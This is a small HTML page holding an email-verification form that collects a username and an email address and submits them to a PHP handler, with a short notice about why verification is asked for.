<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="mailver.css" type="text/css" media="all" />
    <title>Verify yourself</title>
</head>
<body>
    <section class="background">
        <form class="form-body" action="handler.php" method="post">
            <h2>Verify yourself</h2>
            <div class="msg-bx info-bx">
                <p>
                    For security purpose you have to verify your Email. Once verified, it does not have to be done a second time.
                </p>
                <b>N.B : We don't share your information. </b>
            </div>
            <input type="text" name="name" id="name" placeholder="Username" required/>
            <input type="email" name="email" id="email" placeholder="Email Address" required/>
            <input type="submit" name="submit" id="submit" value="Submit" />
        </form>
        
    </section>

</body>
</html>